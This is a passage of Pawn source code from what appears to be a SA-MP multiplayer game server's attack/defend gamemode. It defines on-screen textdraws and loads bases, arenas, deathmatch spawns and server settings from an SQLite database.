	TextDrawHideForPlayer(playerid,rightBlueBG);
	TextDrawHideForPlayer(playerid,timerCenterTD);
	TextDrawHideForPlayer(playerid,leftTeamData);
	TextDrawHideForPlayer(playerid,rightTeamData);
	TextDrawHideForPlayer(playerid,centerTeamNames);
}

RoundTextdrawsCreate()
{
	centerblackBG = TextDrawCreate	(	100.705993, 	382.667022, 	"-"			);
	TextDrawLetterSize				(	centerblackBG, 	30.371185, 		10.792751	);
	TextDrawAlignment				(	centerblackBG, 	1							);
	TextDrawColor					(	centerblackBG, 	0x000000EE					);
	TextDrawSetShadow				(	centerblackBG, 	0							);
	TextDrawSetOutline				(	centerblackBG, 	-1							);
	TextDrawBackgroundColor			(	centerblackBG, 	0x00000055					);
	TextDrawFont					(	centerblackBG, 	1							);
	TextDrawSetProportional			(	centerblackBG, 	1							);

	fullBox3D = TextDrawCreate		(	664.964416, 	457.374145,	 	"usebox"	);
	TextDrawLetterSize				(	fullBox3D, 		0.000000, 		-1.895202	);
	TextDrawTextSize				(	fullBox3D, 		-14.329409, 	0.000000	);
	TextDrawAlignment				(	fullBox3D, 		1							);
	TextDrawColor					(	fullBox3D, 		0							);
	TextDrawUseBox					(	fullBox3D, 		true						);
	TextDrawBoxColor				(	fullBox3D, 		0x000000FF					);
	TextDrawSetShadow				(	fullBox3D, 		0							);
	TextDrawSetOutline				(	fullBox3D, 		0							);
	TextDrawFont					(	fullBox3D, 		1							);

	leftRedBG = TextDrawCreate		(	335.540924, 	401.283630, "-");
	TextDrawLetterSize				(	leftRedBG, 		-28.081052, 7.287504);
	TextDrawAlignment				(	leftRedBG, 		1							);
	TextDrawColor					(	leftRedBG, 		0xDE000066					);
	TextDrawSetShadow				(	leftRedBG, 		-1							);
	TextDrawSetOutline				(	leftRedBG, 		0							);
	TextDrawBackgroundColor			(	leftRedBG, 		0x00000099					);
	TextDrawFont					(	leftRedBG, 		1							);
	TextDrawSetProportional			(	leftRedBG, 		1							);

	rightBlueBG = TextDrawCreate	(	311.741302, 	401.283630, "-"				);
	TextDrawLetterSize				(	rightBlueBG, 	28.770492, 7.287504			);
	TextDrawAlignment				(	rightBlueBG, 	1							);
	TextDrawColor					(	rightBlueBG, 	0x3344FF66					);
	TextDrawSetShadow				(	rightBlueBG, 	-1							);
	TextDrawSetOutline				(	rightBlueBG,	0							);
	TextDrawBackgroundColor			(	rightBlueBG, 	0x00000099					);
	TextDrawFont					(	rightBlueBG, 	1							);
	TextDrawSetProportional			(	rightBlueBG, 	1							);

	timerCenterTD = TextDrawCreate	(	324.140991, 		434.872528, "~w~0:00 / ~r~~h~00");
	TextDrawLetterSize				(	timerCenterTD, 		0.267410, 	1.349164	);
	TextDrawTextSize				(	timerCenterTD, 		299.293579, 98.583343	);
	TextDrawAlignment				(	timerCenterTD, 		2						);
	TextDrawColor					(	timerCenterTD, 		-1						);
	TextDrawSetShadow				(	timerCenterTD, 		0						);
	TextDrawSetOutline				(	timerCenterTD, 		0						);
	TextDrawBackgroundColor			(	timerCenterTD,	 	-1						);
	TextDrawFont					(	timerCenterTD, 		2						);
	TextDrawSetProportional			(	timerCenterTD, 		1						);

	leftTeamData = TextDrawCreate	(	254.400375, 		436.160705, "~w~_");
	TextDrawLetterSize				(	leftTeamData, 		0.219527, 1.220829		);
	TextDrawAlignment				(	leftTeamData, 		2						);
	TextDrawColor					(	leftTeamData, 		-1						);
	TextDrawSetShadow				(	leftTeamData, 		0						);
	TextDrawSetOutline				(	leftTeamData, 		-1						);
	TextDrawBackgroundColor			(	leftTeamData, 		-16777131				);
	TextDrawFont					(	leftTeamData, 		1						);
	TextDrawSetProportional			(	leftTeamData, 		1						);

	rightTeamData = TextDrawCreate	(	388.682586, 		436.150573, "~w~_");
	TextDrawLetterSize				(	rightTeamData, 		0.219527, 1.220829);
	TextDrawAlignment				(	rightTeamData, 		2						);
	TextDrawColor					(	rightTeamData, 		-1						);
	TextDrawSetShadow				(	rightTeamData, 		0						);
	TextDrawSetOutline				(	rightTeamData, 		-1						);
	TextDrawBackgroundColor			(	rightTeamData, 		0x3278FF33				);
	TextDrawFont					(	rightTeamData, 		1						);
	TextDrawSetProportional			(	rightTeamData, 		1						);

//Qwerty _______________________________________________________________ ~b~~h~~h~Asdfg");
	centerTeamNames = TextDrawCreate(	317.176452, 		429.976257, "~r~~h~~h~__- __ -");
	TextDrawLetterSize				(	centerTeamNames, 	0.230700, 	1.267498	);
	TextDrawAlignment				(	centerTeamNames, 	2						);
	TextDrawColor					(	centerTeamNames, 	-1						);
	TextDrawSetShadow				(	centerTeamNames,	0						);
	TextDrawSetOutline				(	centerTeamNames, 	1						);
	TextDrawBackgroundColor			(	centerTeamNames, 	0x00000033				);
	TextDrawFont					(	centerTeamNames,	2						);
	TextDrawSetProportional			(	centerTeamNames, 	1						);


}

//===


LoadPlayerTextDraws(playerid)
{

    BITCH = CreatePlayerTextDraw(playerid, 330.000000, 350.000000,"_");
	PlayerTextDrawFont(playerid, BITCH, 1);
	PlayerTextDrawLetterSize(playerid, BITCH, 0.40000, 2.00000);
	PlayerTextDrawBackgroundColor(playerid, BITCH, MAIN_BACKGROUND_COLOUR);
	PlayerTextDrawColor(playerid, BITCH, -65281);
	PlayerTextDrawSetOutline(playerid, BITCH, 1);
    PlayerTextDrawAlignment(playerid, BITCH, 2);
    PlayerTextDrawSetShadow(playerid, BITCH, 0);

    TargetInfoTD = CreatePlayerTextDraw(playerid, 50.000000, 285.000000, "_");
	PlayerTextDrawBackgroundColor(playerid, TargetInfoTD, MAIN_BACKGROUND_COLOUR);
	PlayerTextDrawFont(playerid, TargetInfoTD, 1);
	PlayerTextDrawLetterSize(playerid, TargetInfoTD, 0.200000, 1.0);
	PlayerTextDrawColor(playerid, TargetInfoTD, 255);
	PlayerTextDrawSetOutline(playerid, TargetInfoTD, 1);
	PlayerTextDrawSetProportional(playerid, TargetInfoTD, 1);
	PlayerTextDrawTextSize(playerid, TargetInfoTD, 167.000000, 0.000000);

	TD_RoundSpec = CreatePlayerTextDraw(playerid, 330.000000, 350.000000,"_");
	PlayerTextDrawFont(playerid, TD_RoundSpec, 1);
	PlayerTextDrawLetterSize(playerid, TD_RoundSpec, 0.40000, 2.00000);
	PlayerTextDrawBackgroundColor(playerid, TD_RoundSpec, MAIN_BACKGROUND_COLOUR);
	PlayerTextDrawColor(playerid, TD_RoundSpec, -65281);
	PlayerTextDrawSetOutline(playerid, TD_RoundSpec, 1);
    PlayerTextDrawAlignment(playerid, TD_RoundSpec, 2);
    PlayerTextDrawSetShadow(playerid, TD_RoundSpec, 0);

	FPSPingPacket = CreatePlayerTextDraw(playerid,500.5, 1.4, "_");
	PlayerTextDrawBackgroundColor(playerid, FPSPingPacket, MAIN_BACKGROUND_COLOUR);
	PlayerTextDrawFont(playerid, FPSPingPacket, 1);
    PlayerTextDrawLetterSize(playerid, FPSPingPacket, 0.190000, 0.93000);
	PlayerTextDrawColor(playerid, FPSPingPacket, 16711935);
	PlayerTextDrawSetOutline(playerid, FPSPingPacket, 1);
	PlayerTextDrawSetProportional(playerid, FPSPingPacket, 1);
	PlayerTextDrawSetShadow(playerid, FPSPingPacket,0);
	PlayerTextDrawAlignment(playerid, FPSPingPacket, 1);

	RoundKillDmgTDmg = CreatePlayerTextDraw(playerid,3.000000, 387.000000, "_");
	PlayerTextDrawFont(playerid, RoundKillDmgTDmg, 1);
	PlayerTextDrawLetterSize(playerid, RoundKillDmgTDmg, 0.200000, 0.900000);
	PlayerTextDrawBackgroundColor(playerid, RoundKillDmgTDmg,MAIN_BACKGROUND_COLOUR);
	PlayerTextDrawColor(playerid, RoundKillDmgTDmg, 16711935);
	PlayerTextDrawSetOutline(playerid, RoundKillDmgTDmg, 1);
	PlayerTextDrawSetProportional(playerid, RoundKillDmgTDmg, 1);
	PlayerTextDrawSetShadow(playerid, RoundKillDmgTDmg, 0);

	DoingDamage[0] = CreatePlayerTextDraw(playerid,170.0,362.0 + 10,"_");
	PlayerTextDrawFont(playerid, DoingDamage[0], 1);
	PlayerTextDrawLetterSize(playerid, DoingDamage[0], 0.18000, 0.9);
	PlayerTextDrawBackgroundColor(playerid, DoingDamage[0],MAIN_BACKGROUND_COLOUR);
	PlayerTextDrawColor(playerid, DoingDamage[0], 16727295);
	PlayerTextDrawSetProportional(playerid, DoingDamage[0], 1);
	PlayerTextDrawSetOutline(playerid, DoingDamage[0],1);
    PlayerTextDrawSetShadow(playerid, DoingDamage[0],0);

	DoingDamage[1] = CreatePlayerTextDraw(playerid,170.0,372.0+ 10,"_");
	PlayerTextDrawFont(playerid, DoingDamage[1], 1);
	PlayerTextDrawLetterSize(playerid, DoingDamage[1], 0.18000, 0.9);
	PlayerTextDrawBackgroundColor(playerid, DoingDamage[1],MAIN_BACKGROUND_COLOUR);
	PlayerTextDrawColor(playerid, DoingDamage[1], 16727295);
	PlayerTextDrawSetProportional(playerid, DoingDamage[1], 1);
	PlayerTextDrawSetOutline(playerid, DoingDamage[1],1);
    PlayerTextDrawSetShadow(playerid, DoingDamage[1],0);

	DoingDamage[2] = CreatePlayerTextDraw(playerid,170.0,382.0+ 10,"_");
	PlayerTextDrawFont(playerid, DoingDamage[2], 1);
	PlayerTextDrawLetterSize(playerid, DoingDamage[2], 0.18000, 0.9);
	PlayerTextDrawBackgroundColor(playerid, DoingDamage[2],MAIN_BACKGROUND_COLOUR);
	PlayerTextDrawColor(playerid, DoingDamage[2], 16727295);
	PlayerTextDrawSetProportional(playerid, DoingDamage[2], 1);
	PlayerTextDrawSetOutline(playerid, DoingDamage[2],1);
    PlayerTextDrawSetShadow(playerid, DoingDamage[2],0);

	GettingDamaged[0] = CreatePlayerTextDraw(playerid,380.0,362.0+ 10,"_");
	PlayerTextDrawFont(playerid, GettingDamaged[0], 1);
	PlayerTextDrawLetterSize(playerid, GettingDamaged[0], 0.18000, 0.9);
	PlayerTextDrawBackgroundColor(playerid, GettingDamaged[0],MAIN_BACKGROUND_COLOUR);
	PlayerTextDrawColor(playerid, GettingDamaged[0], 16727295);
	PlayerTextDrawSetProportional(playerid, GettingDamaged[0], 1);
	PlayerTextDrawSetOutline(playerid, GettingDamaged[0],1);
	PlayerTextDrawSetShadow(playerid, GettingDamaged[0],0);

	GettingDamaged[1] = CreatePlayerTextDraw(playerid,380.0,372.0+ 10,"_");
	PlayerTextDrawFont(playerid, GettingDamaged[1], 1);
	PlayerTextDrawLetterSize(playerid, GettingDamaged[1], 0.18000, 0.9);
	PlayerTextDrawBackgroundColor(playerid, GettingDamaged[1],MAIN_BACKGROUND_COLOUR);
	PlayerTextDrawColor(playerid, GettingDamaged[1], 16727295);
	PlayerTextDrawSetProportional(playerid, GettingDamaged[1], 1);
	PlayerTextDrawSetOutline(playerid, GettingDamaged[1],1);
	PlayerTextDrawSetShadow(playerid, GettingDamaged[1],0);

	GettingDamaged[2] = CreatePlayerTextDraw(playerid,380.0,382.0+ 10,"_");
	PlayerTextDrawFont(playerid, GettingDamaged[2], 1);
	PlayerTextDrawLetterSize(playerid, GettingDamaged[2], 0.18000, 0.9);
	PlayerTextDrawBackgroundColor(playerid, GettingDamaged[2],MAIN_BACKGROUND_COLOUR);
	PlayerTextDrawColor(playerid, GettingDamaged[2], 16727295);
	PlayerTextDrawSetProportional(playerid, GettingDamaged[2], 1);
	PlayerTextDrawSetOutline(playerid, GettingDamaged[2],1);
	PlayerTextDrawSetShadow(playerid, GettingDamaged[2],0);

	RoundText = CreatePlayerTextDraw(playerid, 318.0,431.5,"_");
	PlayerTextDrawFont(playerid, RoundText, 1);
	PlayerTextDrawTextSize(playerid, RoundText, 14.0,640.0);
	PlayerTextDrawLetterSize(playerid, RoundText, 0.28, 1.20);
	PlayerTextDrawBackgroundColor(playerid, RoundText, 0xF6FF4733);
	PlayerTextDrawColor(playerid, RoundText, -65281);
	PlayerTextDrawSetOutline(playerid, RoundText, 1);
	PlayerTextDrawSetShadow(playerid, RoundText, 0);
    PlayerTextDrawAlignment(playerid, RoundText, 2);
    PlayerTextDrawSetProportional(playerid, RoundText, 1);

//    WhoSpec[0] = CreatePlayerTextDraw(playerid, 567, 304.00000 -65, "_");
    WhoSpec[0] = CreatePlayerTextDraw(playerid, 1, 150.00000, "_");
	PlayerTextDrawBackgroundColor(playerid, WhoSpec[0], MAIN_BACKGROUND_COLOUR);
	PlayerTextDrawFont(playerid, WhoSpec[0], 1);
	PlayerTextDrawLetterSize(playerid, WhoSpec[0], 0.180000, 0.9);
	PlayerTextDrawColor(playerid, WhoSpec[0], -65281);
	PlayerTextDrawSetOutline(playerid, WhoSpec[0], 1);
	PlayerTextDrawSetProportional(playerid, WhoSpec[0], 1);
	PlayerTextDrawSetShadow(playerid, WhoSpec[0], 0);


//    WhoSpec[1] = CreatePlayerTextDraw(playerid,567, 369.000000-65, "_");
    WhoSpec[1] = CreatePlayerTextDraw(playerid, 1, 215.000000, "_");
	PlayerTextDrawBackgroundColor(playerid, WhoSpec[1], MAIN_BACKGROUND_COLOUR);
	PlayerTextDrawFont(playerid, WhoSpec[1], 1);
	PlayerTextDrawLetterSize(playerid, WhoSpec[1], 0.180000, 0.9);
	PlayerTextDrawColor(playerid, WhoSpec[1], -65281);
	PlayerTextDrawSetOutline(playerid, WhoSpec[1], 1);
	PlayerTextDrawSetProportional(playerid, WhoSpec[1], 1);
	PlayerTextDrawSetShadow(playerid, WhoSpec[1], 0);

	SpecText[0] = CreatePlayerTextDraw(playerid, 4.333333, 354.251831 - 70.0, "LD_POKE:cd9s");
	PlayerTextDrawLetterSize(playerid, SpecText[0], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, SpecText[0], 72.000000, 75);
	PlayerTextDrawAlignment(playerid, SpecText[0], 1);
	PlayerTextDrawColor(playerid, SpecText[0], 0x00000033);
	PlayerTextDrawSetShadow(playerid, SpecText[0], 0);
	PlayerTextDrawSetOutline(playerid, SpecText[0], 0);
	PlayerTextDrawFont(playerid, SpecText[0], 4);

    SpecText[1] = CreatePlayerTextDraw(playerid, 40, 350 - 70.0, "_");
	PlayerTextDrawFont(playerid, SpecText[1], 1);
	PlayerTextDrawLetterSize(playerid, SpecText[1], 0.20000, 1.000000);
	PlayerTextDrawColor(playerid, SpecText[1], -65281);
	PlayerTextDrawBackgroundColor(playerid, SpecText[1], MAIN_BACKGROUND_COLOUR);
	PlayerTextDrawSetOutline(playerid, SpecText[1], 1);
	PlayerTextDrawSetShadow(playerid, SpecText[1], 0);
	PlayerTextDrawAlignment(playerid, SpecText[1], 2);

	SpecText[2] = CreatePlayerTextDraw(playerid, 80.333333, 354.251831 - 70.0, "LD_POKE:cd9s");
	PlayerTextDrawLetterSize(playerid, SpecText[2], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, SpecText[2], 58.000000, 75);
	PlayerTextDrawAlignment(playerid, SpecText[2], 1);
	PlayerTextDrawColor(playerid, SpecText[2], 0x00000033);
	PlayerTextDrawSetShadow(playerid, SpecText[2], 0);
	PlayerTextDrawSetOutline(playerid, SpecText[2], 0);
	PlayerTextDrawFont(playerid, SpecText[2], 4);

    SpecText[3] = CreatePlayerTextDraw(playerid, 85, 350 - 70.0, "_");
	PlayerTextDrawFont(playerid, SpecText[3], 1);
	PlayerTextDrawLetterSize(playerid, SpecText[3], 0.20000, 1.000000);
	PlayerTextDrawColor(playerid, SpecText[3], -65281);
	PlayerTextDrawBackgroundColor(playerid, SpecText[3], MAIN_BACKGROUND_COLOUR);
	PlayerTextDrawSetOutline(playerid, SpecText[3], 1);
	PlayerTextDrawSetShadow(playerid, SpecText[3], 0);
	PlayerTextDrawAlignment(playerid, SpecText[3], 1);
	
   	AreaCheckTD = CreatePlayerTextDraw(playerid,320.000000, 210.000000, "_");
	PlayerTextDrawAlignment(playerid, AreaCheckTD, 2);
	PlayerTextDrawBackgroundColor(playerid, AreaCheckTD, MAIN_BACKGROUND_COLOUR);
	PlayerTextDrawFont(playerid, AreaCheckTD, 1);
	PlayerTextDrawLetterSize(playerid, AreaCheckTD, 0.6, 3.00000);
	PlayerTextDrawColor(playerid, AreaCheckTD, -65281);
	PlayerTextDrawSetOutline(playerid, AreaCheckTD, 1);
	PlayerTextDrawSetProportional(playerid, AreaCheckTD, 1);
	PlayerTextDrawSetShadow(playerid, AreaCheckTD, 0);

	AreaCheckBG = CreatePlayerTextDraw(playerid,645.00000, -5.000000," ~n~ ~n~ ~n~ ~n~ ~n~ ~n~ ~n~ ~n~ ~n~ ~n~ ~n~ ~n~~n~ ~n~~n~~n~ ~n~ ~n~ ~n~ ~n~ ~n~ ~n~ ~n~ ~n~ ~n~ ~n~ ~n~ ~n~~n~ ~n~~n~~n~~n~ ~n~ ~n~ ~n~ ~n~ ~n~ ~n~ ~n~ ~n~ ~n~ ~n~ ~n~~n~ ~n~~n~~n~ ");
    PlayerTextDrawUseBox(playerid, AreaCheckBG, 1);
    PlayerTextDrawTextSize(playerid, AreaCheckBG, -5, 645);
    PlayerTextDrawBoxColor(playerid, AreaCheckBG, 0x00000044);
	PlayerTextDrawSetOutline(playerid, AreaCheckBG,0);

	DeathText[0] = CreatePlayerTextDraw(playerid,322.000000, 346.000000, "_");
	PlayerTextDrawBackgroundColor(playerid, DeathText[0], MAIN_BACKGROUND_COLOUR);
	PlayerTextDrawFont(playerid, DeathText[0], 1);
	PlayerTextDrawLetterSize(playerid, DeathText[0], 0.250000, 1.2000);
	PlayerTextDrawColor(playerid, DeathText[0], 16711935);
	PlayerTextDrawSetOutline(playerid, DeathText[0], 1);
	PlayerTextDrawSetProportional(playerid, DeathText[0], 1);
	PlayerTextDrawSetShadow(playerid, DeathText[0], 0);
	PlayerTextDrawAlignment(playerid, DeathText[0], 2);

	DeathText[1] = CreatePlayerTextDraw(playerid,322, 360.000000, "_");
	PlayerTextDrawBackgroundColor(playerid, DeathText[1], MAIN_BACKGROUND_COLOUR);
	PlayerTextDrawFont(playerid, DeathText[1], 1);
	PlayerTextDrawLetterSize(playerid, DeathText[1], 0.250000, 1.2000);
	PlayerTextDrawColor(playerid, DeathText[1], 16711935);
	PlayerTextDrawSetOutline(playerid, DeathText[1], 1);
	PlayerTextDrawSetProportional(playerid, DeathText[1], 1);
	PlayerTextDrawSetShadow(playerid, DeathText[1], 0);
	PlayerTextDrawAlignment(playerid, DeathText[1], 2);
	
    DeathMessage[0] = CreatePlayerTextDraw(playerid, 193.000000, 157.000000, "Random says this to you");
	PlayerTextDrawBackgroundColor(playerid, DeathMessage[0], -16776961);
	PlayerTextDrawFont(playerid, DeathMessage[0], 1);
	PlayerTextDrawLetterSize(playerid, DeathMessage[0], 0.280000, 1.200000);
	PlayerTextDrawColor(playerid, DeathMessage[0], -1);
	PlayerTextDrawSetOutline(playerid, DeathMessage[0], 1);
	PlayerTextDrawSetProportional(playerid, DeathMessage[0], 1);
	
	DeathMessage[1] = CreatePlayerTextDraw(playerid, 318.000000, 177.000000, "This is my death message");
	PlayerTextDrawAlignment(playerid, DeathMessage[1], 2);
	PlayerTextDrawBackgroundColor(playerid, DeathMessage[1], -16776961);
	PlayerTextDrawFont(playerid, DeathMessage[1], 2);
	PlayerTextDrawLetterSize(playerid, DeathMessage[1], 0.270000, 1.200000);
	PlayerTextDrawColor(playerid, DeathMessage[1], -65281);
	PlayerTextDrawSetOutline(playerid, DeathMessage[1], 1);
	PlayerTextDrawSetProportional(playerid, DeathMessage[1], 1);
	PlayerTextDrawUseBox(playerid, DeathMessage[1], 1);
	PlayerTextDrawBoxColor(playerid, DeathMessage[1], 153);
	PlayerTextDrawTextSize(playerid, DeathMessage[1], 794.000000, 271.000000);
	return 1;
}


//------------------------------------------------------------------------------
// Bases, Arenas, DMs and Configs
//------------------------------------------------------------------------------


LoadBases()
{
	new iString[64];
    TotalBases = 0;

	new DBResult:res = db_query(sqliteconnection, "SELECT * FROM 'Bases' ORDER BY ID ASC");

    for(new i = 0; i < MAX_BASES; i++) BExist[i] = false;
    new i;
	do {
		db_get_field_assoc(res, "ID", iString, sizeof(iString));
		i = strval(iString);

	    db_get_field_assoc(res, "AttSpawn", iString, sizeof(iString));
	    sscanf(iString, "p,fff", BAttackerSpawn[i][0], BAttackerSpawn[i][1], BAttackerSpawn[i][2]);

	    db_get_field_assoc(res, "DefSpawn", iString, sizeof(iString));
	    sscanf(iString, "p,fff", BDefenderSpawn[i][0], BDefenderSpawn[i][1], BDefenderSpawn[i][2]);

	    db_get_field_assoc(res, "CPSpawn", iString, sizeof(iString));
	    sscanf(iString, "p,fff", BCPSpawn[i][0], BCPSpawn[i][1], BCPSpawn[i][2]);
	    
		db_get_field_assoc(res, "Interior", iString, sizeof(iString));
		BInterior[i] = strval(iString);

	    db_get_field_assoc(res, "Name", BName[i], 128);

	    TotalBases++;
		BExist[i] = true;

	} while(db_next_row(res));

	db_free_result(res);

	printf("Bases Loaded: %d", TotalBases);
}

LoadArenas()
{
    new iString[64];
	TotalArenas = 0;

	new DBResult:res = db_query(sqliteconnection, "SELECT * FROM Arenas ORDER BY ID ASC");

    for(new i = 0; i < MAX_ARENAS; i++) AExist[i] = false;
	new i;
	do {
		db_get_field_assoc(res, "ID", iString, sizeof(iString));
		i = strval(iString);

		db_get_field_assoc(res, "AttSpawn", iString, sizeof(iString));
	    sscanf(iString, "p,fff", AAttackerSpawn[i][0], AAttackerSpawn[i][1], AAttackerSpawn[i][2]);

	    db_get_field_assoc(res, "DefSpawn", iString, sizeof(iString));
	    sscanf(iString, "p,fff", ADefenderSpawn[i][0], ADefenderSpawn[i][1], ADefenderSpawn[i][2]);

	    db_get_field_assoc(res, "CPSpawn", iString, sizeof(iString));
	    sscanf(iString, "p,fff", ACPSpawn[i][0], ACPSpawn[i][1], ACPSpawn[i][2]);

	    db_get_field_assoc(res, "Max", iString, sizeof(iString));
	    sscanf(iString, "p,ff", AMax[i][0], AMax[i][1]);

	    db_get_field_assoc(res, "Min", iString, sizeof(iString));
	    sscanf(iString, "p,ff", AMin[i][0], AMin[i][1]);

		db_get_field_assoc(res, "Interior", iString, sizeof(iString));
	    AInterior[i] = strval(iString);

	    db_get_field_assoc(res, "Name", AName[i], 128);

	    AExist[i] = true;
	    TotalArenas++;
	} while(db_next_row(res));

	printf("Arenas Loaded: %d", TotalArenas);
}

LoadDMs()
{
	new iString[64], TotalDMs;

	new DBResult:res = db_query(sqliteconnection, "SELECT * FROM DMs ORDER BY ID ASC");

	for(new i = 0; i < MAX_DMS; i++) DMExist[i] = false;
	new i;
	do {
		db_get_field_assoc(res, "ID", iString, sizeof(iString));
		i = strval(iString);

	    db_get_field_assoc(res, "Spawn", iString, sizeof(iString));
	    sscanf(iString, "p,ffff", DMSpawn[i][0], DMSpawn[i][1], DMSpawn[i][2], DMSpawn[i][3]);

		db_get_field_assoc(res, "Interior", iString, sizeof(iString));
		DMInterior[i] = strval(iString);

		for(new j = 0; j < 3; ++j) {
		    new str[10], Str[128];
		    format(str, sizeof(str), "Wep%d", j+1);
            db_get_field_assoc(res, str, Str, 128);
			DMWeapons[i][j] = strval(Str);
		}
		DMExist[i] = true;

	    //db_next_row(res);
	    TotalDMs++;
	} while(db_next_row(res));

	printf("DMs Loaded: %d", TotalDMs);
}

LoadConfig()
{
	new iString[128];
    new DBResult:res = db_query(sqliteconnection, "SELECT * FROM Configs");
    Skin[NON] = 0;

	db_get_field_assoc(res, "Value", iString, sizeof(iString)); // Attacker Skin
    Skin[ATTACKER] = strval(iString);
	db_next_row(res);

	db_get_field_assoc(res, "Value", iString, sizeof(iString)); // Attacker Sub Skin
    Skin[ATTACKER_SUB] = strval(iString);
	db_next_row(res);

	db_get_field_assoc(res, "Value", iString, sizeof(iString)); // Defender Skin
    Skin[DEFENDER] = strval(iString);
	db_next_row(res);

	db_get_field_assoc(res, "Value", iString, sizeof(iString)); // Defender Sub Skin
    Skin[DEFENDER_SUB] = strval(iString);
	db_next_row(res);

	db_get_field_assoc(res, "Value", iString, sizeof(iString)); // Referee Skin
    Skin[REFEREE] = strval(iString);
	db_next_row(res);

	db_get_field_assoc(res, "Value", iString, sizeof(iString)); // Server Weather
    MainWeather = strval(iString);
	db_next_row(res);

	db_get_field_assoc(res, "Value", iString, sizeof(iString)); // Server Time
    MainTime = strval(iString);
	db_next_row(res);

	db_get_field_assoc(res, "Value", iString, sizeof(iString)); // CP Time
    ConfigCPTime = strval(iString);
	db_next_row(res);

	db_get_field_assoc(res, "Value", iString, sizeof(iString)); // Round Time
    ConfigRoundTime = strval(iString);
	db_next_row(res);

	db_get_field_assoc(res, "Value", iString, sizeof(iString)); // Total Rounds
    TotalRounds = strval(iString);
	db_next_row(res);

	db_get_field_assoc(res, "Value", iString, sizeof(iString)); // Maximum Packetloss
    Max_Packetloss = floatstr(iString);
	db_next_row(res);

	db_get_field_assoc(res, "Value", iString, sizeof(iString)); // Maximum Ping
    Max_Ping = strval(iString);
	db_next_row(res);

	db_get_field_assoc(res, "Value", iString, sizeof(iString)); // Minimum FPS
    Min_FPS = strval(iString);
	db_next_row(res);

	db_get_field_assoc(res, "Value", iString, sizeof(iString)); // Weapon Limits
	sscanf(iString, "p,dddddddddd", WeaponLimit[0], WeaponLimit[1], WeaponLimit[2], WeaponLimit[3], WeaponLimit[4], WeaponLimit[5], WeaponLimit[6], WeaponLimit[7], WeaponLimit[8], WeaponLimit[9]);
	db_next_row(res);

    db_get_field_assoc(res, "Value", iString, sizeof(iString)); // Main Spawn
	sscanf(iString, "p,ffffd", MainSpawn[0], MainSpawn[1], MainSpawn[2], MainSpawn[3], MainInterior);
    db_next_row(res);

    db_get_field_assoc(res, "Value", iString, sizeof(iString)); // GunMenuWeapons
    new slots[10][20];
    sscanf(iString, "p|ssssssssss", slots[0], slots[1], slots[2], slots[3], slots[4], slots[5], slots[6], slots[7], slots[8], slots[9]);

    for(new i = 0; i < 10; ++ i)
	{
	    if(slots[i][strlen(slots[i])-1] == '|')
		{
			strdel(slots[i], strlen(slots[i]) - 1, strlen(slots[i]));
		}
		sscanf(slots[i], "p,dd", GunMenuWeapons[i][0], GunMenuWeapons[i][1]);
    }

    db_next_row(res);

    db_get_field_assoc(res, "Value", iString, sizeof(iString));
    sscanf(iString, "p,ff", RoundAR, RoundHP);

	db_next_row(res);

	db_get_field_assoc(res, "Value", iString, sizeof(iString));

	sscanf(iString, "s", WebString);
	db_next_row(res);

	db_get_field_assoc(res, "Value", iString, sizeof(iString)); // Target Player Information
    ToggleTargetInfo = (strval(iString) == 1 ? true : false);
	db_next_row(res);

	db_get_field_assoc(res, "Value", iString, sizeof(iString)); // Show Team HP and Damage
    TeamHPDamage = (strval(iString) == 1 ? true : false);
	db_next_row(res);

	// ANTI-LAG

	AntiLagTD = TextDrawCreate(75.000000, 327.000000, "_");
	TextDrawBackgroundColor(AntiLagTD, MAIN_BACKGROUND_COLOUR);
	TextDrawFont(AntiLagTD, 1);
	TextDrawLetterSize(AntiLagTD, 0.149999, 0.899999);
	TextDrawColor(AntiLagTD, -1);
	TextDrawSetOutline(AntiLagTD, 1);
	TextDrawSetProportional(AntiLagTD, 1);
	TextDrawSetProportional(AntiLagTD, 1);

	db_get_field_assoc(res, "Value", iString, sizeof(iString)); // Server AntiLag
    ServerAntiLag = (strval(iString) == 1 ? true : false);
    if(ServerAntiLag == true) TextDrawSetString(AntiLagTD, sprintf("%sAntiLag: ~g~On", MAIN_TEXT_COLOUR));
    else TextDrawSetString(AntiLagTD, "_");
	db_next_row(res);

	// ANTI-LAG

    db_get_field_assoc(res, "Value", iString, sizeof(iString)); // Main Background Colour
    MAIN_BACKGROUND_COLOUR = strval(iString);
	db_next_row(res);

	db_get_field_assoc(res, "Value", iString, sizeof(iString)); // Main Text Colour
	
	sscanf(iString, "s", MAIN_TEXT_COLOUR);
	db_next_row(res);


	db_get_field_assoc(res, "Value", iString, sizeof(iString)); // MAX tdm kills
	MaxTDMKills = strval(iString);
	if( MaxTDMKills <= 0 ) MaxTDMKills = 10;
	db_next_row(res);

	db_get_field_assoc(res, "Value", iString, sizeof(iString)); // Color Scheme ID
 	format( ColScheme, 10, "{%s}", iString );
 	db_next_row(res);

 	db_get_field_assoc(res, "Value", iString, sizeof(iString)); // Knives
    GiveKnife = (strval(iString) == 1 ? true : false);
    db_next_row(res);

    db_get_field_assoc(res, "Value", iString, sizeof(iString)); // ShowBodyLabels
    ShowBodyLabels = (strval(iString) == 1 ? true : false);
    db_next_row(res);

    db_get_field_assoc(res, "Value", iString, sizeof(iString)); // VoteRound
    VoteRound = (strval(iString) == 1 ? true : false);
    db_next_row(res);

    db_get_field_assoc(res, "Value", iString, sizeof(iString)); // Changename
    ChangeName = (strval(iString) == 1 ? true : false);
    db_next_row(res);

	db_free_result(res);

	printf("Server Config Loaded.");
}

//------------------------------------------------------------------------------
// Other Functions
//------------------------------------------------------------------------------

forward SpawnConnectedPlayer(playerid, team);
public SpawnConnectedPlayer(playerid, team)
{
    if(Player[playerid][Spawned] == false)
	{
	    StyleTextDrawFix(playerid);
		if(team == 0)
		{
			if(WarMode == false)
			{
			    Player[playerid][Team] = GetTeamWithLessPlayers();
			    switch(Player[playerid][Team])
				{
			        case ATTACKER: SetPlayerColor(playerid, ATTACKER_NOT_PLAYING);
			        case DEFENDER: SetPlayerColor(playerid, DEFENDER_NOT_PLAYING);
				}
			}
			else
			{
				new ToAddIn;

			    if(strfind(Player[playerid][Name], TeamName[ATTACKER], true) != -1) ToAddIn = ATTACKER;
			    else if(strfind(Player[playerid][Name], TeamName[DEFENDER], true) != -1) ToAddIn = DEFENDER;
			    else ToAddIn = NON;

		        switch(ToAddIn)
				{
		            case NON:
					{
					    Player[playerid][Team] = GetTeamWithLessPlayers();
					    switch(Player[playerid][Team])
						{
